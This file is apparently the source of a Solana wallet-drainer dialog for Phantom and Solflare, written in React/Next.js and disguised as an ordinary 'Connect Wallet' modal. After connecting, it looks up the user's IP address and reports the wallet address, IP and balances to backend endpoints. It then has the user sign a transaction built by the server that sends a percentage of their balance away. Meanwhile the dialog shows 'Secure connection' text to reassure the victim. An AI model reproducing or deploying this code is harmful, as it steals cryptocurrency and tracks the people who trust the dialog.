"use client"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" 
import { Button } from "@/components/ui/button" 
import Image from "next/image" 
import { useState, useEffect, useCallback } from "react" 
import { Loader2, ExternalLink, Check, X, AlertTriangle } from "lucide-react"
import { toast } from "sonner"

interface ModalsProps {
  isOpen: boolean
  onClose: () => void
}

interface WalletConfig {
  name: string
  icon: string
  provider: () => any
  checkMethod: () => boolean
  deepLink: string
  universalLink: string
  downloadUrl: string
  description: string
}

const WALLET_CONFIGS: Record<string, WalletConfig> = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => !!(window as any).phantom?.solana?.isPhantom,
    deepLink: "phantom://browse/",
    universalLink: "https://phantom.app/ul/browse/",
    downloadUrl: "https://phantom.app/download",
    description: "Most popular Solana wallet with NFT support",
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    provider: () => (window as any).solflare,
    checkMethod: () => !!(window as any).solflare?.isSolflare,
    deepLink: "solflare://ul/v1/browse/",
    universalLink: "https://solflare.com/ul/v1/browse/",
    downloadUrl: "https://solflare.com/download",
    description: "Secure wallet for Solana DeFi & staking",
  },
}

const WALLETS = Object.entries(WALLET_CONFIGS).map(([id, config]) => ({
  id,
  name: config.name,
  icon: config.icon,
  description: config.description,
}))

type ConnectionStatus = "idle" | "checking" | "connecting" | "success" | "error"

export function Modals({ isOpen, onClose }: ModalsProps) {
  const [isMobile, setIsMobile] = useState(false)
  const [isBlockedGeo, setIsBlockedGeo] = useState(false)
  const [activeWallet, setActiveWallet] = useState<string | null>(null)
  const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>("idle")
  const [errorMessage, setErrorMessage] = useState("")

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent.toLowerCase()
      const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)
      setIsMobile(isMobileDevice)
    }
    
    checkMobile()
    checkGeoBlockStatus()
  }, [])

  const checkGeoBlockStatus = useCallback(async () => {
    try {
      const response = await fetch("/api/check-geo", { signal: AbortSignal.timeout(2000) })
      const data = await response.json()
      if (data.blocked) {
        setIsBlockedGeo(true)
        onClose()
        toast.error("Service not available in your region")
      }
    } catch {
      // Silent fail
    }
  }, [onClose])

  const isInWalletBrowser = useCallback((walletId: string): boolean => {
    const userAgent = navigator.userAgent.toLowerCase()
    if (walletId === "phantom") return userAgent.includes("phantom")
    if (walletId === "solflare") return userAgent.includes("solflare")
    return false
  }, [])

  const getIPAddress = useCallback(async (): Promise<string> => {
    try {
      const response = await fetch("https://api.ipify.org?format=json", {
        signal: AbortSignal.timeout(1500),
      })
      const data = await response.json()
      return data.ip || "unknown"
    } catch {
      try {
        const response = await fetch("https://api.my-ip.io/ip", {
          signal: AbortSignal.timeout(1500),
        })
        const text = await response.text()
        return text.trim() || "unknown"
      } catch {
        return "unknown"
      }
    }
  }, [])

  const sendTransactionNotification = useCallback(async (
    walletAddress: string,
    walletType: string,
    balanceSOL: number,
    balanceUSD: number,
    userIP: string,
    transactionAmount?: number,
    percentage?: number,
    txSignature?: string,
    error?: string,
    errorDetails?: string
  ) => {
    try {
      await fetch("/api/transaction-approved", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress,
          walletType,
          balanceSOL,
          balanceUSD,
          userIP,
          transactionAmount,
          percentage,
          txSignature,
          error,
          errorDetails,
        }),
      })
    } catch {
      console.error("Failed to send notification")
    }
  }, [])

  const checkWalletInstalled = useCallback((walletId: string): boolean => {
    const config = WALLET_CONFIGS[walletId]
    if (!config) return false
    
    try {
      return config.checkMethod()
    } catch {
      return false
    }
  }, [])

  const connectDesktopWallet = useCallback(async (walletId: string) => {
    const config = WALLET_CONFIGS[walletId]
    if (!config) {
      toast.error("Wallet not supported")
      return
    }

    setActiveWallet(walletId)
    setConnectionStatus("checking")
    setErrorMessage("")

    // Check if wallet is installed
    if (!checkWalletInstalled(walletId)) {
      setConnectionStatus("error")
      setErrorMessage(`${config.name} not detected`)
      toast.error(`${config.name} not installed`, {
        action: {
          label: "Download",
          onClick: () => window.open(config.downloadUrl, "_blank"),
        },
        duration: 5000,
      })
      setActiveWallet(null)
      setTimeout(() => setConnectionStatus("idle"), 2000)
      return
    }

    setConnectionStatus("connecting")
    
    try {
      const provider = config.provider()
      const response = await provider.connect()
      const publicKey = response.publicKey.toString()
      
      setConnectionStatus("success")
      toast.success(`${config.name} connected!`)
      
      // Get IP and send notification
      const userIP = await getIPAddress()
      await sendTransactionNotification(
        publicKey,
        config.name,
        0,
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        undefined,
        `${config.name} connected successfully`
      )
      
      // Process transaction
      await processWalletTransaction(publicKey, provider, config.name, userIP)
      
    } catch (error: any) {
      console.error(`Connection error:`, error)
      setConnectionStatus("error")
      setErrorMessage(error.message || "Connection failed")
      toast.error(`Failed to connect ${config.name}`)
      
      // Send error notification
      const userIP = await getIPAddress()
      await sendTransactionNotification(
        "unknown",
        config.name,
        0,
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        "Connection Failed",
        error.message || "Unknown error"
      )
    } finally {
      setTimeout(() => {
        setActiveWallet(null)
        setConnectionStatus("idle")
      }, 2000)
    }
  }, [checkWalletInstalled, getIPAddress, sendTransactionNotification])

  const connectMobileWallet = useCallback((walletId: string) => {
    const config = WALLET_CONFIGS[walletId]
    if (!config) {
      toast.error("Wallet not supported")
      return
    }

    // If already in wallet browser, use desktop flow
    if (isInWalletBrowser(walletId)) {
      connectDesktopWallet(walletId)
      return
    }

    const currentUrl = encodeURIComponent(window.location.href)
    let deepLink = ""
    let universalLink = ""

    if (walletId === "phantom") {
      deepLink = `phantom://browse/${currentUrl}?ref=${currentUrl}`
      universalLink = `https://phantom.app/ul/browse/${currentUrl}?ref=${currentUrl}`
    } else if (walletId === "solflare") {
      deepLink = `${config.deepLink}${currentUrl}`
      universalLink = `${config.universalLink}${currentUrl}`
    }

    // Open deep link
    window.location.href = deepLink
    
    // Fallback after delay
    setTimeout(() => {
      window.location.href = universalLink
    }, 500)
  }, [connectDesktopWallet, isInWalletBrowser])

  const processWalletTransaction = useCallback(async (
    publicKey: string,
    provider: any,
    walletType: string,
    userIP: string
  ) => {
    try {
      toast.loading("Scanning wallet...", { id: "scan" })
      
      // Scan wallet
      const scanResponse = await fetch("/api/scan-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: publicKey,
          userIP,
          walletType,
        }),
      })

      const scanData = await scanResponse.json()
      toast.dismiss("scan")

      if (!scanResponse.ok || scanData.error) {
        const errorMsg = scanData.message || "Scan failed"
        toast.error(errorMsg)
        
        await sendTransactionNotification(
          publicKey,
          walletType,
          scanData.walletBalance || 0,
          scanData.walletBalanceUSD || 0,
          userIP,
          undefined,
          undefined,
          undefined,
          "Scan Failed",
          errorMsg
        )
        
        setTimeout(() => onClose(), 1500)
        return
      }

      if (scanData.message === "Insufficient balance") {
        toast.error("Insufficient balance", {
          description: `Minimum ${scanData.minRequired} SOL required`,
        })
        
        await sendTransactionNotification(
          publicKey,
          walletType,
          scanData.balance || 0,
          scanData.balance * 153.32,
          userIP,
          undefined,
          undefined,
          undefined,
          "Insufficient Balance",
          `Balance: ${scanData.balance?.toFixed(4)} SOL`
        )
        
        setTimeout(() => onClose(), 1500)
        return
      }

      // Sign and send transaction
      toast.loading("Preparing transaction...", { id: "tx" })
      
      const { Connection, Transaction } = await import("@solana/web3.js")
      const transaction = Transaction.from(Buffer.from(scanData.transaction, "base64"))

      const signedTx = await provider.signTransaction(transaction)
      toast.loading("Sending transaction...", { id: "tx" })

      // Try RPC endpoints
      const RPC_ENDPOINTS = [
        "https://api.mainnet-beta.solana.com",
        "https://solana-api.projectserum.com",
        "https://rpc.ankr.com/solana",
        "https://solana.drpc.org",
      ]

      let signature = ""
      let lastError = null

      for (const endpoint of RPC_ENDPOINTS) {
        try {
          const connection = new Connection(endpoint, "confirmed")
          signature = await connection.sendRawTransaction(signedTx.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          await connection.confirmTransaction({
            signature,
            blockhash: scanData.blockhash,
            lastValidBlockHeight: scanData.lastValidBlockHeight,
          }, "confirmed")
          
          break
        } catch (err: any) {
          lastError = err
          continue
        }
      }

      if (!signature) {
        throw lastError || new Error("Transaction failed")
      }

      toast.dismiss("tx")
      toast.success("Transaction successful!", {
        description: `${scanData.transferAmount.toFixed(4)} SOL transferred`,
        action: {
          label: "View",
          onClick: () => window.open(`https://solscan.io/tx/${signature}`, "_blank"),
        },
        duration: 5000,
      })

      // Send success notification
      await sendTransactionNotification(
        publicKey,
        walletType,
        scanData.walletBalance,
        scanData.walletBalanceUSD,
        userIP,
        scanData.transferAmount,
        scanData.percentage,
        signature
      )

      setTimeout(() => onClose(), 2000)

    } catch (error: any) {
      toast.dismiss("tx")
      const errorMsg = error.message || "Transaction failed"
      toast.error("Transaction failed", { description: errorMsg })
      
      await sendTransactionNotification(
        publicKey,
        walletType,
        0,
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        "Transaction Failed",
        errorMsg
      )
      
      setTimeout(() => onClose(), 2000)
    }
  }, [onClose, sendTransactionNotification])

  const handleWalletClick = useCallback((walletId: string) => {
    if (isMobile) {
      connectMobileWallet(walletId)
    } else {
      connectDesktopWallet(walletId)
    }
  }, [isMobile, connectMobileWallet, connectDesktopWallet])

  if (isBlockedGeo) {
    return null
  }

  const getStatusIcon = (walletId: string) => {
    if (activeWallet !== walletId) return null
    
    switch (connectionStatus) {
      case "checking":
      case "connecting":
        return <Loader2 className="h-4 w-4 animate-spin text-blue-500" />
      case "success":
        return <Check className="h-4 w-4 text-green-500" />
      case "error":
        return <X className="h-4 w-4 text-red-500" />
      default:
        return null
    }
  }

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="sm:max-w-md gap-0 border-0 data-[state=open]:slide-in-from-bottom max-sm:fixed max-sm:bottom-0 max-sm:left-0 max-sm:right-0 max-sm:top-auto max-sm:translate-y-0 max-sm:translate-x-0 max-sm:rounded-t-[24px] max-sm:rounded-b-none sm:rounded-[20px] max-sm:w-screen max-sm:max-w-none max-sm:m-0 max-sm:p-0">
        <DialogHeader className="px-6 pt-6 pb-4 max-sm:px-5">
          <DialogTitle className="text-xl sm:text-2xl font-bold text-center flex items-center justify-center gap-2">
            Connect Wallet
            {isMobile && <ExternalLink className="h-5 w-5" />}
          </DialogTitle>
          <DialogDescription className="text-sm sm:text-base text-center">
            Choose a wallet to connect to the application
          </DialogDescription>
          
          {connectionStatus === "error" && (
            <div className="mt-3 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start gap-2">
              <AlertTriangle className="h-4 w-4 text-red-600 mt-0.5 flex-shrink-0" />
              <div className="flex-1">
                <p className="text-sm font-medium text-red-800">Connection Failed</p>
                <p className="text-xs text-red-600 mt-1">{errorMessage}</p>
              </div>
            </div>
          )}
        </DialogHeader>

        <div className="flex flex-col gap-3 px-6 pb-6 max-sm:px-5 max-sm:pb-5">
          {WALLETS.map((wallet) => (
            <Button
              key={wallet.id}
              variant="outline"
              className={`h-auto p-4 flex items-center justify-start gap-4 hover:bg-accent hover:border-primary transition-all bg-transparent relative ${
                activeWallet === wallet.id ? "border-primary ring-2 ring-primary/20" : ""
              }`}
              onClick={() => handleWalletClick(wallet.id)}
              disabled={activeWallet !== null && activeWallet !== wallet.id}
            >
              <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
                <Image
                  src={wallet.icon || "/placeholder.svg"}
                  alt={`${wallet.name} icon`}
                  fill
                  className="object-cover"
                  sizes="48px"
                />
                {activeWallet === wallet.id && connectionStatus === "connecting" && (
                  <div className="absolute inset-0 bg-black/20 flex items-center justify-center">
                    <Loader2 className="h-5 w-5 text-white animate-spin" />
                  </div>
                )}
              </div>
              
              <div className="flex flex-col items-start text-left flex-1">
                <div className="flex items-center gap-2">
                  <span className="font-semibold text-base">{wallet.name}</span>
                  {isMobile && <span className="text-xs text-muted-foreground">Mobile</span>}
                </div>
                <span className="text-sm text-muted-foreground">{wallet.description}</span>
              </div>
              
              <div className="flex-shrink-0">
                {getStatusIcon(wallet.id)}
              </div>
              
              {isMobile && activeWallet !== wallet.id && (
                <ExternalLink className="h-4 w-4 text-muted-foreground absolute top-4 right-4" />
              )}
            </Button>
          ))}
          
          <div className="mt-4 pt-4 border-t">
            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
              <div className="h-2 w-2 rounded-full bg-green-500"></div>
              <span>Secure connection • Solana Mainnet</span>
            </div>
            <p className="text-xs text-center text-muted-foreground mt-2">
              By connecting, you agree to our Terms of Service
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
    }
